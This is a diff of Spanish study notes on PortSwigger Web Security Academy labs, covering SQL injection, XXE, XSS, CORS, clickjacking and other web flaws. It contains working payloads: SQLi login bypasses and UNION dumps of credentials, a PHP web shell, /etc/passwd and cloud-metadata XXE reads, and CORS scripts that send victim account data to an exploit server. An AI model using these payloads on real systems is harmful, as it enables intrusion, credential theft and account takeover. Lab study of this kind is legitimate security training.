@@ -1,28 +1,55 @@
 	####SQL Injection
-	###Basico
-Esto puede darse de varias formas distintas, la basica y la primera que aparece en Burp academy (https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data) 
+	###Definicion
+Es una vulnerabilidad donde un atacante puede acceder a los datos de la base de datos.
+	###Vulnerabilidades
+	##Basic
+Retriving hidden data: Consta de modificar una query para obtener mas data.
+Un ejemplo de esto seria modificar https://insecure-website.com/products?category=Gifts por https://insecure-website.com/products?category=Gifts'--
+Gracias a -- le estamos diciendo que ignore todo lo que sigue en la query. generando que, la query no tenga mas variables.
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1; generando que luego del cambio sea:
+#Esta seria la query original sin modificar
+SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1; ignorando lo siguiente al --
+#Esta seria la query resultante luego de modificar la busqueda
+
+Tambien se puede intentar que la aplicacion devuelva TODO lo que posee (en este caso articulos para comprar) agregando OR 1=1 generando que la query se vea tal que:
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+#Esta query buscaria todo donde categorya sea gift o 1=1 o sea, donde sea gift o true
+
+Subverting application logic: Se trata de cambiar la query para hacerla interferir con la logica de la aplicacion.
+Esto se puede ver aplicado mas que nada en pantallas de logueo donde al agregar -- en el usuario se podria obviar la password ya que la query podria quedar como:
+SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+#Query con administrator'-- en username
+
+UNION attacks: Se generan usando la palabra UNION para poder ejecutar mas querys SELECT. Esto se realiza agregando al input la query UNION
+' UNION SELECT username, password FROM users--
+#Agregando esto en el input donde se debe ingresar el dato a buscar, se puede ver la data solicitada.
+
+Examining the database:Se trata de poder obtener informacion de la base de datos gracias a la vulnerabilidad
+SELECT * FROM information_schema.tables
+#Obtener informacion sobre las tablas que posee la DB
+
+Blind SQL injection: Se refiere a una DB vulnerable que no devuelve el resultados de la SQL injection ni errores. Aun asi pueden explotarse.
+
+lab: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data 
 consta de consultas mediante peticiones GET las cuales pueden ser manipuladas.
 Para verificar dicha vulnerabilidad solo hay que ingresar algun caracter como comillas simples para saber si nos devuelve un error puesto que la query
 se romperia.
 Una vez determinado esto hay una serie de elementos que permiten poder ver que hay por detras:
-
---
-#Con esto le estamos diciendo que ignore todo lo que sigue en la query.
-
 '' OR 1=1 --
 #Con esto estamos diciendo que devuelva WHERE elemento = '' OR 1=1
 #Esto es siempre true por lo que va a mostrar todo
 
 
-Cuando nos encontramos en un login (https://portswigger.net/web-security/sql-injection/lab-login-bypass) se puede aplicar lo mismo de arriba.
+lab: https://portswigger.net/web-security/sql-injection/lab-login-bypass) 
+Consta de una pagina de login donde se puede aplicar lo mismo de arriba.
 Si pasamos el usuario, cerramos las comillas (') y luego agregamos -- para que no tome en cuenta otros parametros para que la query sea
 true como puede ser la password, podriamos acceder.
-
 user: Administrator'--
 password: asd
 #Esto se utilizo en el lab para resolverlo. En este caso la query sea (seguramente) SELECT something FROM users WHERE user = <'user'> and password <'password'>
 
 	####Authentication
+	###Definicion
 	###Basico
 lab https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
 Un problema ya no tan comun es la de aclararle al usuario que la contraseña es incorrecta o que el usuario es incorrecto. Cuando esto se le dice por separado a la persona que quiere ingresar
@@ -41,6 +68,7 @@ En este laboratorio se da un error en la logica con la que se resetea la contras
 Esto genera que la peticion pueda modificarse, ponerse otro usuario y que se cambie la contraseña de este si el usr existe.
 
 	####Directory traversal
+	###Definicion
 	###Basico
 lab: https://portswigger.net/web-security/file-path-traversal/lab-simple
 Esta vulnerabilidad consta en poder listar archivos gracias a la forma en la que la web app obtiene las imagenes de los productos.
@@ -52,6 +80,7 @@ filename=/../../../etc/passwd
 #Gracias a la forma de buscar y que no se limpia lo que se le pide, podemo slistar archivos del sistema
 
 	####Business logic
+	###Definicion
 	###Basic
 lab: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls
 La confianza en el usuario puede generar problemas de seguridad. En este caso el problemas se da a causa de que el precio esta en cleartext en la request.
@@ -71,6 +100,7 @@ vas alternando entre 1 y otro para poder obtener el descuento total del producto
 
 
 	####Access control vulnerabilities
+	###Definicion
 	###Basic
 lab: https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality
 En robots.txt esta el admin panel. Dicho panel es accesible para todos
@@ -105,13 +135,163 @@ lab: https://portswigger.net/web-security/access-control/lab-insecure-direct-obj
 Se puede descargar la transcricpion de los chats. Dicha descarga se hace mediante una request que se puede editar generando asi poder descargar transcripciones de otras personas.
 En este caso, descargo un chat donde carlos decia su password.
 
-	###File upload vulnerabilities
-	##Basic
+	####File upload vulnerabilities
+	###Definicion
+	###Basic
 lab: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
 Se puede subir un php como imagen. Al ir hacia la ubicacion donde se almacena podemos usarlo de shell. Shell usada: <?php system($_GET["cmd"]); ?>
 
 lab: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass
 Similar al anterior pero se filtra lo que se puede subir. Para bypasear esto solo se debe ver la request de subida de archivo y cambiar el content-type a image/jpeg y dejar la extension del archivo como php.
 Una vez hecho esto, la pagina acepta exploit y podemos usarlo.
+
+	####XML external entity (XXE) injection
+	###Definicion
+	###Basic
+lab: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
+El lab presenta una funcion de stock que busca mediante XML. Para obtener informacion del sistema podemos agregar entre la declaracion de xml y la primer sentencia el siguinete codigo:
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+#Esto nos permite buscar el archivo etc/passwd en el sistema
+
+Una vez agregado el codigo, se debe llamar a xxe cambiando el productId por &xxe;
+Nos devuelve un mensaje de error pero justo debajo de eso imprime el archivo
+
+lab: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf
+La idea del lab es la misma pero con la diferencia de que en vez de buscar un archivo mediante /xxxx/xxxx se busca con la ip, obteniendo los folders e ir reemplazandolo en el codigo:
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+#A partir de latest es lo que se va obteniendo al querer obtener xxe hasta llegar ala SecretKey
+
+	####Cross-site scripting (XSS)
+	###Definicion
+XSS es una vulnerabilidad que permite al atacante comprometer a un usuario interactuando con una aplicacion vulnerable.
+Comunmente, para saber si una aplicacion es vulnerable, se utiliza payload para que se ejecute JavaScript. Una funcion comun para esto es alert()
+Chrome, arreglo esto de la funcion alert para que no pueda ser llamada. En estos casos puede usarse print().
+
+	###Vulnerabilidades
+Reflected XSS: El script viene en la request del HTTP.
+https://insecure-website.com/status?message=All+is+well.
+#Un ejemplo con alert seria: https://insecure-website.com/status?message=All+is+well.<script>alert()</script>
+
+"onmouseover="alert(1)
+
+Stored XSS: El script viene de la base de datos con source no confiable sin control de la data.
+<p>Hello, this is my message!</p>
+<script>alert()</script>
+#Esto suele darse en comentarios (por ejemplo) usando alert como ejemplo el comentario se veria asi
+#De esta forma, todos los que vean el comentario recibiran el alert()
+javascript:alert(1)
+#JavaScript URL
+'-alert(1)-'
+#JavaScript string
+
+DOM-based XSS: Se da cuando una aplicacion contiene client-side JavaScript que procesa data de forma incorrecta desde una fuente no confiabvle.
+var search = document.getElementById('search').value;
+var results = document.getElementById('results');
+results.innerHTML = 'You searched for: ' + search;
+#"><svg onload=alert(1)>
+#<img src=1 onerror=alert(1)>
+
+javascript:alert(document.cookie)
+
+<iframe src="https://0a1000e6038d057a8077a32100510031.web-security-academy.net//#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+
+
+
+	####Cross-site request forgery
+	###Definicion
+CSRF es un vulnerabilidad que le permite al atacante inducir a usuarios a realizar acciones que ellos no pretendian realizar. Un ejemplo de esto puede ser cambiar el mail de la cuenta o la contraseña.
+Para que este ataque sea posible deben darse 3 ondiciones.
+
+Accion relevante: Accion en la aplicacion que el atacante tenga razones a inducir.
+Cookie-based session handling: Las acciones se realizan mediante request HTTPs por lo que la aplicacion use las cookies unicamente para identificar a un usuario seria beneficioso para el atacante.
+Parametros predecibles en request: Se refiere a request con parametros que el atacante puede adivinar. Un ejemplo de esto seria que para cambiar la password la funcion es vulnerable si no se necesita saber la actual.
+
+Si encontramos una funcionalida de la aplicacion la cual puede desencadenar en CSRF, podemos utilizar la seccion action para generar un CSRF PoC con la request interceptada.
+
+	####Cross-origin resource sharing (CORS)
+	###Definicion
+CORS es un mecanismo de los navegadores que permiten el control de accesos a recursos fuera del dominio el cual extiende la flexibilidad de Same origin policy. 
+Muchas paginas tienen que interactuar con subdominios o 3ros de cofnianza que requieren cross origin access, para ello esta CORS.
+Aun asi, si esta mal implementado o pobremente configurado, CORS no es una proteccion contra cross origin attacks
+*Same Origin Policy (SOP) limita la habilidad del navegador de interactuar con recursos fuera del dominio. 
+
+	###Vulnerabilidades
+	##Basic
+Server-generated ACAO header from client-specified Origin header: Las aplicaciones deben comunicarse con otros dominios generando que deba haber una lista de aquellos permitidos.
+Algunas aplicaciones toman el camino sencillo de permitir accesos desde cualquier dominio y, para esto, se puede leer el origin header de la request incluyendo el header donde menciona el origen. Si al cambiar esto, la response sigue aceptando el origin como valido, es vulnerable.
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','page/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
+#Ejemplo de script para obtener detalles de la cuenta de la victima.
+
+Errors parsing Origin headers: Muchas veces los origines se aceptan o no mediante una whitelist, tambien muchas veces sucede que se acepta de subdominios existentes y futuros, generando esta vulnerabilidad.
+Puede estar confirgurado para aceptar origenes que empiecen o terminen de una determinada forma, generando una via de ataque.
+
+Whitelisted null origin value: Se da cuando se acepta origen null generando una response 200 ok.
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+#iframe sandbox genera una null request. Haciendo asi que este sea un ejemplo para la vulnerabilidad
+
+	####Clickjacking
+	###Definicion
+Es la accion en la que un usuario es inducido a clickear sobre un contenido accionable oculto en un website.
+	###Vulnerabilidades
+	##Basic
+How to construct a basic clickjacking attack: Estos ataques usan CSS para crear y manupular capas para que el usuario clickee en otra cosa de la que quiere.
+Esto se suele lograr on un iframe.
+<style>
+    iframe {
+        position:relative;
+        width:1000px;
+        height: 700px;
+        opacity: 0.0001;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:520px;
+        left:60px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="https://0af6001304a6dc2e805aa44b0059009c.web-security-academy.net/my-account"></iframe>
+#Ejemplo de un clickjacking basico (lab 1)
+
+Clickjacking with prefilled form input:
+<style>
+    iframe {
+        position:relative;
+        width:1000px;
+        height: 700px;
+        opacity: 0.1;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:525px;
+        left:60px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="https://0a7c004f033d7855c6aae11000670020.web-security-academy.net/my-account?email=gabooo@attacker-website.com"></iframe>
+#Tambien se puede asignar una accion a la pagina como para cambiar el nombre y hacer click en el boton que genera la accion
 
 
